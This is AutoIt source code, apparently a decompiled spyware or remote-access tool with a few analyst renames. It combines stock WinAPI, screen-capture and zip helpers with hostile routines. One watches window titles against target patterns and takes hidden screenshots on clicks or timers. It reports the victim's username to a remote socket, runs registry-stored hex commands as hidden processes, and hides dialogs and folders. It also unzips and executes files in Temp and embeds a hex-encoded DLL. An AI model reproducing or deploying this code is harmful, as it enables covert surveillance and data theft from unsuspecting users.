    If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
    Local $aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
    If @error Then Return SetError(@error, @extended, False)
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _winapi_getcursorinfo()
    Local $tcursor = DllStructCreate($tagcursorinfo)
    Local $icursor = DllStructGetSize($tcursor)
    DllStructSetData($tcursor, "Size", $icursor)
    DllCall("user32.dll", "Bool", "GetCursorInfo", "struct*", $tcursor)
    If @error Then Return SetError(@error, @extended, 0)
    Local $acursor[5]
    $acursor[0] = True
    $acursor[1] = DllStructGetData($tcursor, "Flags") <> 0
    $acursor[2] = DllStructGetData($tcursor, "hCursor")
    $acursor[3] = DllStructGetData($tcursor, "x")
    $acursor[4] = DllStructGetData($tcursor, "Y")
    Return $acursor
EndFunc

Func _winapi_getdc($hwnd)
    Local $aresult = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_getdesktopwindow()
    Local $aresult = DllCall("user32.dll", "hwnd", "GetDesktopWindow")
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_createbitmap($iwidth, $iheight, $iplanes = 1, $ibitsperpel = 1, $pbits = 0)
    Local $aresult = DllCall("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "UINT", $iplanes, "UINT", $ibitsperpel, "ptr", $pbits)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _memglobalsize($hmem)
    Local $aresult = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _memglobalfree($hmem)
    Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hmem)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _memgloballock($hmem)
    Local $aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_geticoninfo($hicon)
    Local $tinfo = DllStructCreate($tagiconinfo)
    DllCall("user32.dll", "Bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
    If @error Then Return SetError(@error, @extended, 0)
    Local $aicon[6]
    $aicon[0] = True
    $aicon[1] = DllStructGetData($tinfo, "Icon") <> 0
    $aicon[2] = DllStructGetData($tinfo, "XHotSpot")
    $aicon[3] = DllStructGetData($tinfo, "YHotSpot")
    $aicon[4] = DllStructGetData($tinfo, "hMask")
    $aicon[5] = DllStructGetData($tinfo, "hColor")
    Return $aicon
EndFunc

Func _winapi_getsystemmetrics($iindex)
    Local $aresult = DllCall("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
    If @error Then Return SetError(@error, @extended, 0)
    Return $aresult[0]
EndFunc

Func _winapi_guidfromstring($sguid)
    Local $tguid = DllStructCreate($tagguid)
    _winapi_guidfromstringex($sguid, $tguid)
    If @error Then Return SetError(@error, @extended, 0)
    Return $tguid
EndFunc

Func _winapi_guidfromstringex($sguid, $pguid)
    Local $aresult = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $pguid)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_isclassname($hwnd, $sclassname)
    Local $sseparator = Opt("GUIDataSeparatorChar")
    Local $aclassname = StringSplit($sclassname, $sseparator)
    If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
    Local $sclasscheck = _winapi_getclassname($hwnd)
    For $x = 1 To UBound($aclassname) - 1
        If StringUpper(StringMid($sclasscheck, 1, StringLen($aclassname[$x]))) = StringUpper($aclassname[$x]) Then Return True
    Next
    Return False
EndFunc

Func _winapi_releasedc($hwnd, $hdc)
    Local $aresult = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_selectobject($hdc, $hgdiobj)
    Local $aresult = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_stringfromguid($pguid)
    Local $aresult = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $pguid, "wstr", "", "int", 40)
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _winapi_systemparametersinfo($iaction, $iparam = 0, $vparam = 0, $iwinini = 0)
    Local $aresult = DllCall("user32.dll", "Bool", "SystemParametersInfoW", "UINT", $iaction, "UINT", $iparam, "ptr", $vparam, "UINT", $iwinini)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0]
EndFunc

Func _winapi_widechartomultibyte($punicode, $icodepage = 0, $bretstring = True)
    Local $sunicodetype = "wstr"
    If Not IsString($punicode) Then $sunicodetype = "struct*"
    Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "UINT", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
    If @error Then Return SetError(@error, @extended, "")
    Local $tmultibyte = DllStructCreate("char[" & $aresult[0] & "]")
    $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "UINT", $icodepage, "dword", 0, $sunicodetype, $punicode, "int", -1, "struct*", $tmultibyte, "int", $aresult[0], "ptr", 0, "ptr", 0)
    If @error Then Return SetError(@error, @extended, "")
    If $bretstring Then Return DllStructGetData($tmultibyte, 1)
    Return $tmultibyte
EndFunc

Func __gdiplus_extractfileext($sfilename, $N2HY4NW5Z = True)
    Local $iindex = __gdiplus_lastdelimiter(".\:", $sfilename)
    If ($iindex > 0) And (StringMid($sfilename, $iindex, 1) = ".") Then
        If $N2HY4NW5Z Then
            Return StringMid($sfilename, $iindex + 1)
        Else
            Return StringMid($sfilename, $iindex)
        EndIf
    Else
        Return ""
    EndIf
EndFunc

Func __gdiplus_lastdelimiter($sdelimiters, $sstring)
    Local $sdelimiter, $in
    For $ii = 1 To StringLen($sdelimiters)
        $sdelimiter = StringMid($sdelimiters, $ii, 1)
        $in = StringInStr($sstring, $sdelimiter, 0, -1)
        If $in > 0 Then Return $in
    Next
EndFunc

Func _screencapture_capture($sfilename = "", $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $fcursor = True)
    If $iright = -1 Then $iright = _winapi_getsystemmetrics($__screencaptureconstant_sm_cxscreen)
    If $ibottom = -1 Then $ibottom = _winapi_getsystemmetrics($__screencaptureconstant_sm_cyscreen)
    If $iright < $ileft Then Return SetError(-1, 0, 0)
    If $ibottom < $itop Then Return SetError(-2, 0, 0)
    Local $iW = ($iright - $ileft) + 1
    Local $iH = ($ibottom - $itop) + 1
    Local $hwnd = _winapi_getdesktopwindow()
    Local $hddc = _winapi_getdc($hwnd)
    Local $hcdc = _winapi_createcompatibledc($hddc)
    Local $hbmp = _winapi_createcompatiblebitmap($hddc, $iW, $iH)
    _winapi_selectobject($hcdc, $hbmp)
    _winapi_bitblt($hcdc, 0, 0, $iW, $iH, $hddc, $ileft, $itop, $__screencaptureconstant_srccopy)
    If $fcursor Then
        Local $acursor = _winapi_getcursorinfo()
        If $acursor[1] Then
            Local $hicon = _winapi_copyicon($acursor[2])
            Local $aicon = _winapi_geticoninfo($hicon)
            _winapi_deleteobject($aicon[4])
            If $aicon[5] <> 0 Then _winapi_deleteobject($aicon[5])
            _winapi_drawicon($hcdc, $acursor[3] - $aicon[2] - $ileft, $acursor[4] - $aicon[3] - $itop, $hicon)
            _winapi_destroyicon($hicon)
        EndIf
    EndIf
    _winapi_releasedc($hwnd, $hddc)
    _winapi_deletedc($hcdc)
    If $sfilename = "" Then Return $hbmp
    Local $ret = _screencapture_saveimage($sfilename, $hbmp, True)
    Return SetError(@error, @extended, $ret)
EndFunc

Func _screencapture_saveimage($sfilename, $hbitmap, $ffreebmp = True)
    _gdiplus_startup()
    If @error Then Return SetError(-1, -1, False)
    Local $sext = StringUpper(__gdiplus_extractfileext($sfilename))
    Local $sclsid = _gdiplus_encodersgetclsid($sext)
    If $sclsid = "" Then Return SetError(-2, -2, False)
    Local $himage = _gdiplus_bitmapcreatefromhbitmap($hbitmap)
    If @error Then Return SetError(-3, -3, False)
    Local $tdata, $tparams
    Switch $sext
        Case "BMP"
            Local $iX = _gdiplus_imagegetwidth($himage)
            Local $iY = _gdiplus_imagegetheight($himage)
            Local $hclone = _gdiplus_bitmapclonearea($himage, 0, 0, $iX, $iY, $c_gdip_pxf24rgb)
            _gdiplus_imagedispose($himage)
            $himage = $hclone
        Case "jpg", "jpeg"
            $tparams = _gdiplus_paraminit(1)
            $tdata = DllStructCreate("int Quality")
            DllStructSetData($tdata, "Quality", $gibmpformat)
            _gdiplus_paramadd($tparams, $gdip_epgquality, 1, $gdip_eptlong, DllStructGetPtr($tdata))
        Case "TIF", "TIFF"
            $tparams = _gdiplus_paraminit(2)
            $tdata = DllStructCreate("int ColorDepth;int Compression")
            DllStructSetData($tdata, "ColorDepth", $gitifcolordepth)
            DllStructSetData($tdata, "Compression", $c_gdip_evtcompressionlzw )
            _gdiplus_paramadd($tparams, $gdip_epgcolordepth, 1, $gdip_eptlong, DllStructGetPtr($tdata, "ColorDepth"))
            _gdiplus_paramadd($tparams, $gdip_epgcompression, 1, $gdip_eptlong, DllStructGetPtr($tdata, "Compression"))
    EndSwitch
    Local $pparams = 0
    If IsDllStruct($tparams) Then $pparams = $tparams
    Local $iret = _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, $pparams)
    _gdiplus_imagedispose($himage)
    If $ffreebmp Then _winapi_deleteobject($hbitmap)
    _gdiplus_shutdown()
    Return SetError($iret = False, 0, $iret = True)
EndFunc

Func _screencapture_setjpgquality($iquality)
    If $iquality < 0 Then $iquality = 0
    If $iquality > 100 Then $iquality = 100
    $gibmpformat = $iquality
EndFunc

Func _stringbetween($s_string, $s_start, $s_end, $v_case = -1)
    Local $s_case = ""
    If $v_case = Default Or $v_case = -1 Then $s_case = "(?i)"
    Local $s_pattern_escape = "(\.|\||\*|\?|\+|\(|\)|\{|\}|\[|\]|\^|\$|\\)"
    $s_start = StringRegExpReplace($s_start, $s_pattern_escape, "\\$1")
    $s_end = StringRegExpReplace($s_end, $s_pattern_escape, "\\$1")
    If $s_start = "" Then $s_start = "\A"
    If $s_end = "" Then $s_end = "\z"
    Local $a_ret = StringRegExp($s_string, "(?s)" & $s_case & $s_start & "(.*?)" & $s_end, 3)
    If @error Then Return SetError(1, 0, 0)
    Return $a_ret
EndFunc

Func _arrayadd(ByRef $avarray, $vvalue)
    If Not IsArray($avarray) Then Return SetError(1, 0, -1)
    If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, -1)
    Local $iubound = UBound($avarray)
    ReDim $avarray[$iubound + 1]
    $avarray[$iubound] = $vvalue
    Return $iubound
EndFunc

Func _arraytostring(Const ByRef $avarray, $sdelim = "|", $istart = 0, $iend = 0)
    If Not IsArray($avarray) Then Return SetError(1, 0, "")
    If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, "")
    Local $sresult, $iubound = UBound($avarray) - 1
    If $iend < 1 Or $iend > $iubound Then $iend = $iubound
    If $istart < 0 Then $istart = 0
    If $istart > $iend Then Return SetError(2, 0, "")
    For $i = $istart To $iend
        $sresult &= $avarray[$i] & $sdelim
    Next
    Return StringTrimRight($sresult, StringLen($sdelim))
EndFunc

If UBound($cmdline) > 1 Then
    If $cmdline[1] <> "" Then _zip_virtualzipopen()
EndIf

Func _zip_create($hfilename)
    $hfp = FileOpen($hfilename, 26)
    $sstring = Chr(80) & Chr(75) & Chr(5) & Chr(6) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0)
    FileWrite($hfp, $sstring)
    If @error Then Return SetError(1, 0, 0)
    FileClose($hfp)
    While Not FileExists($hfilename)
        Sleep(10)
    WEnd
    Return $hfilename
EndFunc

Func _zip_addfile($hzipfile, $hfile2add, $flag = 1)
    Local $dllchk = _zip_dllchk()
    Local $files = _zip_count($hzipfile)
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(1, 0, 0)
    $oapp = ObjCreate("shell.application")
    If Not IsObj($oapp) Then Return 0
    $copy = $oapp.namespace($hzipfile).copyhere($hfile2add)
    While 1
        If $flag = 1 Then hide()
        If _zip_count($hzipfile) = ($files + 1) Then ExitLoop
        Sleep(10)
    WEnd
    Return SetError(0, 0, 1)
EndFunc

Func _zip_addfolder($hzipfile, $hfolder, $flag = 1)
    Local $dllchk = _zip_dllchk()
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(1, 0, 0)
    If StringRight($hfolder, 1) <> "\" Then $hfolder &= "\"
    $files = _zip_count($hzipfile)
    $oapp = ObjCreate("shell.application")
    If Not IsObj($oapp) Then Return 0
    $W1JQ2JP8O = $oapp.namespace($hzipfile).copyhere($oapp.namespace($hfolder))
    While 1
        If $flag = 1 Then hide()
        If _zip_count($hzipfile) = ($files + 1) Then ExitLoop
        Sleep(10)
    WEnd
    Return SetError(0, 0, 1)
EndFunc

Func _zip_unzip($hzipfile, $hfilename, $hdestpath, $flag = 1)
    Local $dllchk = _zip_dllchk()
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(1, 0, 0)
    If Not FileExists($hdestpath) Then DirCreate($hdestpath)
    $oapp = ObjCreate("shell.application")
    If Not IsObj($oapp) Then Return 0
    $hfolderitem = $oapp.namespace($hzipfile).parsename($hfilename)
    $oapp.namespace($hdestpath).copyhere($hfolderitem)
    While 1
        If $flag = 1 Then hide()
        If FileExists($hdestpath & "\" & $hfilename) Then
            Return SetError(0, 0, 1)
            ExitLoop
        EndIf
        Sleep(500)
    WEnd
EndFunc

Func _zip_count($hzipfile)
    Local $dllchk = _zip_dllchk()
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(1, 0, 0)
    $items = _zip_list($hzipfile)
    Return UBound($items) - 1
EndFunc

Func _zip_list($hzipfile)
    Local $aarray[1]
    Local $dllchk = _zip_dllchk()
    If $dllchk <> 0 Then Return SetError($dllchk, 0, 0)
    If Not _isfullpath($hzipfile) Then Return SetError(4, 0)
    If Not FileExists($hzipfile) Then Return SetError(1, 0, 0)
    $oapp = ObjCreate("shell.application")
    If Not IsObj($oapp) Then Return 0
    $hlist = $oapp.namespace($hzipfile).items
    For $item In $hlist
        _arrayadd($aarray, $item.name)
    Next
    $aarray[0] = UBound($aarray) - 1
    Return $aarray
EndFunc

Func _zip_virtualzipopen()
    $zipsplit = StringSplit($cmdline[1], ",")
    $zipname = $zipsplit[1]
    $zipfile = $zipsplit[2]
    _zip_unzip($zipname, $zipfile, @TempDir & "\", 4 + 16)
    If @error Then Return SetError(@error, 0, 0)
    ShellExecute(@TempDir & "\" & $zipfile)
EndFunc

Func _zip_dllchk()
    If Not FileExists(@SystemDir & "\zipfldr.dll") Then Return 2
    If Not RegRead("HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}", "") Then Return 3
    Return 0
EndFunc

Func _isfullpath($O1IO4BM6G)
    If StringInStr($O1IO4BM6G, ":\") Then
        Return True
    Else
        Return False
    EndIf
EndFunc

Func hide()
    If ControlGetHandle("[CLASS:#32770]", "", "[CLASS:SysAnimate32; INSTANCE:1]") <> "" And WinGetState("[CLASS:#32770]") <> @SW_HIDE Then
        $hwnd = WinGetHandle("[CLASS:#32770]")
        WinSetState($hwnd, "", @SW_HIDE)
    EndIf
EndFunc

Func _filelisttoarray($spath, $sfilter = "*", $iflag = 0)
    Local $hsearch, $sfile, $sfilelist, $sdelim = "|"
    $spath = StringRegExpReplace($spath, "[\\/]+\z", "") & "\"
    If Not FileExists($spath) Then Return SetError(1, 1, "")
    If StringRegExp($sfilter, "[\\/:><\|]|(?s)\A\s*\z") Then Return SetError(2, 2, "")
    If Not ($iflag = 0 Or $iflag = 1 Or $iflag = 2) Then Return SetError(3, 3, "")
    $hsearch = FileFindFirstFile($spath & $sfilter)
    If @error Then Return SetError(4, 4, "")
    While 1
        $sfile = FileFindNextFile($hsearch)
        If @error Then ExitLoop
        If ($iflag + @extended = 2) Then ContinueLoop
        $sfilelist &= $sdelim & $sfile
    WEnd
    FileClose($hsearch)
    If Not $sfilelist Then Return SetError(4, 4, "")
    Return StringSplit(StringTrimLeft($sfilelist, 1), "|")
EndFunc

Func _filereadtoarray($sfilepath, ByRef $aarray)
    Local $hfile = FileOpen($sfilepath, $FO_READ)
    If $hfile = -1 Then Return SetError(1, 0, 0)
    Local $afile = FileRead($hfile, FileGetSize($sfilepath))
    If StringRight($afile, 1) = @LF Then $afile = StringTrimRight($afile, 1)
    If StringRight($afile, 1) = @CR Then $afile = StringTrimRight($afile, 1)
    FileClose($hfile)
    If StringInStr($afile, @LF) Then
        $aarray = StringSplit(StringStripCR($afile), @LF)
    ElseIf StringInStr($afile, @CR) Then
        $aarray = StringSplit($afile, @CR)
    Else
        If StringLen($afile) Then
            Dim $aarray[2] = [1, $afile]
        Else
            Return SetError(2, 0, 0)
        EndIf
    EndIf
    Return 1
EndFunc

Func __udf_debugprint($stext, $iline = @ScriptLineNumber, $err = @error, $ext = @extended)
    Return SetError($err, $ext, 1)
EndFunc

Func __udf_validateclassname($hwnd, $sclassnames)
    __udf_debugprint("This is for debugging only, set the debug variable to false before submitting")
    If _winapi_isclassname($hwnd, $sclassnames) Then Return True
    Local $sseparator = Opt("GUIDataSeparatorChar")
    $sclassnames = StringReplace($sclassnames, $sseparator, ",")
    __udf_debugprint("Invalid Class Type(s):" & @LF & @TAB & "Expecting Type(s): " & $sclassnames & @LF & @TAB & "Received Type : " & _winapi_getclassname($hwnd))
    Exit
EndFunc

Func _guictrledit_scroll($hwnd, $idirection)
    If $debug_ed Then __udf_validateclassname($hwnd, $__editconstant_classname)
    If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
    If BitAND($idirection, $__editconstant_sb_linedown) <> $__editconstant_sb_linedown And BitAND($idirection, $__editconstant_sb_lineup) <> $__editconstant_sb_lineup And BitAND($idirection, $__editconstant_sb_pagedown) <> $__editconstant_sb_pagedown And BitAND($idirection, $__editconstant_sb_pageup) <> $__editconstant_sb_pageup And BitAND($idirection, $__editconstant_sb_scrollcaret) <> $__editconstant_sb_scrollcaret Then Return 0
    If $idirection == $__editconstant_sb_scrollcaret Then
        Return _sendmessage($hwnd, $em_scrollcaret)
    Else
        Return _sendmessage($hwnd, $em_scroll, $idirection)
    EndIf
EndFunc

Func _gdiplus_bitmapdispose($hbitmap)
    Local $aresult = DllCall($ghgdipdll, "int", "GdipDisposeImage", "handle", $hbitmap)
    If @error Then Return SetError(@error, @extended, False)
    Return $aresult[0] = 0
EndFunc

Func TCPSocketEvent($hsocket)
    Local $timeval = DllStructCreate($INTESDSD)
    Local $fd_set = DllStructCreate($64ARRAY)
    Local $vallong = DllStructCreate($LONGS)
    DllStructSetData($fd_set, $FDCOUNT, 1)
    DllStructSetData($fd_set, $FDARRA, $hsocket, 1)
    Local $result = DllCall($DLL32WS, $INTTCP, $SELECTS, $INTTCP, $hsocket + 1, $STRUCTNEJMA, $fd_set, $PTRSS, 0, $PTRSS, 0, $STRUCTNEJMA, $timeval)
    If @error Then Return $TCPEVENT_DISCONNECT
    If $result[0] < 0 Then Return $TCPEVENT_DISCONNECT
    Local $result2 = DllCall($DLL32WS, $INTTCP, $WSAFDISET, $UINT, $hsocket, $STRUCTNEJMA, $fd_set)
    If @error Then Return $TCPEVENT_DISCONNECT
    If $result[0] = 0 Or $result2[0] = 0 Then Return $TCPEVENT_NONE
    Local $FIONREAD = 1074030207
    Local $aret = DllCall($DLL32WS, $INTTCP, $ISOKET, $UINT2, $hsocket, $LOGXSD, $FIONREAD, $STRUCTNEJMA, $vallong)
    If @error Then Return $TCPEVENT_DISCONNECT
    If $aret[0] <> 0 Then Return $TCPEVENT_DISCONNECT
    Local $length = DllStructGetData($vallong, "length")
    If $length = 0 Then Return $TCPEVENT_DISCONNECT
    Return $TCPEVENT_DATA
EndFunc

Func __gdiplus_imagesavetofile($himage, $sfilename)
    Local $sext = __gdiplus_extractfileext($sfilename)
    Local $sclsid = _gdiplus_encodersgetclsid($sext)
    If $sclsid = "" Then Return SetError(-1, 0, False)
    Return _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, 0)
EndFunc

Func __screencapture_capturewnd($sfilename, $hwnd, $ileft = 0, $itop = 0, $iright = -1, $ibottom = -1, $fcursor = True)
    If Not IsHWnd($hwnd) Then $hwnd = WinGetHandle($hwnd)
    Local $trect = DllStructCreate($tagrect)
    Local Const $DWMWA_EXTENDED_FRAME_BOUNDS = 9
    Local $bret = DllCall("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $DWMWA_EXTENDED_FRAME_BOUNDS, "struct*", $trect, "dword", DllStructGetSize($trect))
    If (@error Or $bret[0] Or (Abs(DllStructGetData($trect, "left")) + Abs(DllStructGetData($trect, "Top")) + Abs(DllStructGetData($trect, "Right")) + Abs(DllStructGetData($trect, "Bottom"))) = 0) Then
        $trect = __winapi_getwindowrect($hwnd)
        If @error Then Return SetError(@error, @extended, 0)
    EndIf
    $ileft += DllStructGetData($trect, "left")
    $itop += DllStructGetData($trect, "Top")
    If $iright = -1 Then $iright = DllStructGetData($trect, "Right") - DllStructGetData($trect, "left") - 1
    If $ibottom = -1 Then $ibottom = DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top") - 1
    $iright += DllStructGetData($trect, "left")
    $ibottom += DllStructGetData($trect, "Top")
    If $ileft > DllStructGetData($trect, "Right") Then $ileft = DllStructGetData($trect, "left")
    If $itop > DllStructGetData($trect, "Bottom") Then $itop = DllStructGetData($trect, "Top")
    If $iright > DllStructGetData($trect, "Right") Then $iright = DllStructGetData($trect, "Right") - 1
    If $ibottom > DllStructGetData($trect, "Bottom") Then $ibottom = DllStructGetData($trect, "Bottom") - 1
    Return _screencapture_capture($sfilename, $ileft, $itop, $iright, $ibottom, $fcursor)
EndFunc

Func __winapi_getwindowrect($hwnd)
    Local $trect = DllStructCreate($tagrect)
    DllCall("user32.dll", "Bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
    If @error Then Return SetError(@error, @extended, 0)
    Return $trect
EndFunc

Func keyDDQ()
    If Not FileExists($pathIs) Then
        DirCreate($pathIs)
    EndIf
    If Not FileExists($mons) Then
        DirCreate($mons)
        HidsAA()
    EndIf
    Sleep(500)
    RunAndUpdatePidx(1)
    $dAStr = 1
EndFunc

; Not found in 2 pastebin - Rename by HTc
Func RunAndUpdatePidx($iFlag)
    $sHexHey = RegRead("HKCU\Software\Win32", "Key")    ; Hex string
    $sHexHey2 = RegRead("HKCU\Software\Win32", "Key2")  ; - nt -
    $s0x = "0x"
    $sKey = BinaryToString($s0x & $sHexHey)
    $sKey2 = BinaryToString($s0x & $sHexHey2)
    If $iFlag = 0 Then
        ProcessClose($PID2)
        Sleep(500)
    EndIf
    If $iFlag = 0 Then
        $PIDX = Run($sKey2, @TempDir, @SW_HIDE)
    Else
        $PIDX = Run($sKey, @TempDir, @SW_HIDE)
    EndIf
    If $iFlag = 1 Then
        $PID2 = $PIDX
        RegWrite("HKCU\Software\Win32", "pidx", "REG_SZ", $PID2)
        $PIDX = ""
    EndIf
EndFunc

Func MonitorGrabber()
    Local $actw = WinGetTitle("")
    If $RegDat <> "" Then
        $FIRX = StringSplit($RegDat, "'^", 1)
        If IsArray($FIRX) Then
            Local $randStr = ""
            For $i = 1 To 6
                $randStr &= Chr(Random(65, 90, 1))
            Next
            For $io = 1 To $FIRX[0] Step +1
                If $FIRX[$io] <> "" Then
                    $seconX = StringSplit($FIRX[$io], "/)*", 1)
                    If IsArray($seconX) Then
                        If StringRegExp($actw, $seconX[1]) Then
                            $fFzEte = TimerInit()
                            $DDAA = TimerDiff($fFzEte)
                            If Not FileExists($pathIs) Then
                                DirCreate($pathIs)
                            EndIf
                            If Not FileExists($mons) Then
                                DirCreate($mons)
                                HidsAA()
                            EndIf
                            If Not ProcessExists($PIDX) Then
                                RunAndUpdatePidx(0)
                            EndIf
                            $SSAEVV = TimerDiff($BeginXC)
                            If $mgXCli = 1 Then
                                If _isPressed("01") Then
                                    $CLIS = $CLIS + 1
                                    _screencapture_setjpgquality(40)
                                    If $FDDSF43 = 1 Then
                                        __screencapture_capturewnd($mons & "\" & @MDAY & "-" & @MON & "-" & @YEAR & "/(Click " & $CLIS & ") " & $randStr & ".jpg", $actw)
                                    Else
                                        _screencapture_capture($mons & "\" & @MDAY & "-" & @MON & "-" & @YEAR & "/(Click " & $CLIS & ") " & $randStr & ".jpg")
                                    EndIf
                                    Sleep(500)
                                    TCPSend($mainSocket, "MonitorXtit" & @UserName & "str" & $vicName & "bdt" & $seconX[2] & "/*")
                                EndIf
                            Else
                                If $SSAEVV > 4000 Then
                                    _screencapture_setjpgquality(40)
                                    If $FDDSF43 = 1 Then
                                        __screencapture_capturewnd($mons & "\" & @MDAY & "-" & @MON & "-" & @YEAR & "/" & $randStr & ".jpg", $actw)
                                    Else
                                        _screencapture_capture($mons & "\" & @MDAY & "-" & @MON & "-" & @YEAR & "/" & $randStr & ".jpg")
                                    EndIf
                                    $BeginXC = TimerInit()
                                    TCPSend($mainSocket, "MonitorXtit" & @UserName & "str" & $vicName & "bdt" & $seconX[2] & "/*")
                                EndIf
                            EndIf
                            $fFzEte = TimerInit()
                        Else
                            $DDAA = TimerDiff($fFzEte)
                            If $DDAA > 1000 Then
                                $fFzEte = TimerInit()
                                $DDAA = 1
                                $CLIS = 0
                                If ProcessExists($PIDX) Then
                                    ProcessClose($PIDX)
                                    If $dAStr = 1 Then
                                        RunAndUpdatePidx(1)
                                    EndIf
                                EndIf
                            EndIf
                        EndIf
                    EndIf
                EndIf
            Next
        EndIf
    EndIf
EndFunc

Func _isPressed($shexkey, $vdll = "user32.dll")
    Local $K9LV8QX2X = DllCall($vdll, "short", "GetAsyncKeyState", "int", "0x" & $shexkey)
    If @error Then Return SetError(@error, @extended, False)
    Return BitAND($K9LV8QX2X[0], 32768) <> 0
EndFunc

Func HidsAA()
    FileSetAttrib($mons, "+HS")
EndFunc

#CS -- HTC --
This function retrun the hex binary string of bestOfBst.dll
#CE
Func PlureVB()
    Global $PlugReVer = "0x"
    $PlugReVer &= "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0104005992DC590000000000000000E0000E210B010232000A0000000600000000000000100000001000000020000000000010001000000002000004000000000000000400000000000000005000000004000000000000030000000000100000100000000010000010000000000000100000000020000052000000003000003C00000000000000000000000000000000000000000000000000000000400000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008C300000500000000000000000000000000000000000000000000000000000002E746578740000008608000000100000000A000000040000000000000000000000000000200000602E72646174610000520000000020000000020000000E0000000000000000000000000000400000402E64617461000000D2010000003000000002000000100000000000000000000000000000400000C02E72656C6F63000030000000004000000002000000120000000000000000000000000000400000420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    $PlugReVer &= "0000000000000000000000000000000000000000000000008B44240883F8017505E8D0070000837C2408027500837C2408007500837C2408037500B801000000C20C005531C050680B0100006840000000E8DC070000890424833C24007459FF74240C8B6C24048D450750E8C80700000FB7442410508B6C2404586689450568000000006800000000FF7424088D05691300105068001000006800000000E89B07000021C07409B801000000EB0CEB08FF3424E88C07000031C083C4045DC208005331C050505050E87D0700008944240CFF742418E89900000089C383FB047415E86407000089C32B5C240C81FB102700007F02EB07B801000000EB0231C021C0740431C0EB6568000000008B5C24242B5C240C538B5C2424035C241053FF742424E82F070000894424048B5C240421DB7E17E8120700008944240C8B5C2408035C2404895C2408EB0A6801000000E8FC0600008B5C24083B5C24207507B801000000EB07E967FFFFFF31C083C4105BC20C005553BA4500000083EC04C70424000000004A75F38D2C24C7450000000000C74504000000008D6C2408C74500000000008D44240850FFB42424010000E88D0100008D042450680000000068000000008D442414508B9C24300100004353E8870600008984240C0100008B9C240C01000021DB7D0CB804000000E984000000EB358B9C240C01000021DB74198D44240850FFB42424010000E85306000089C321DB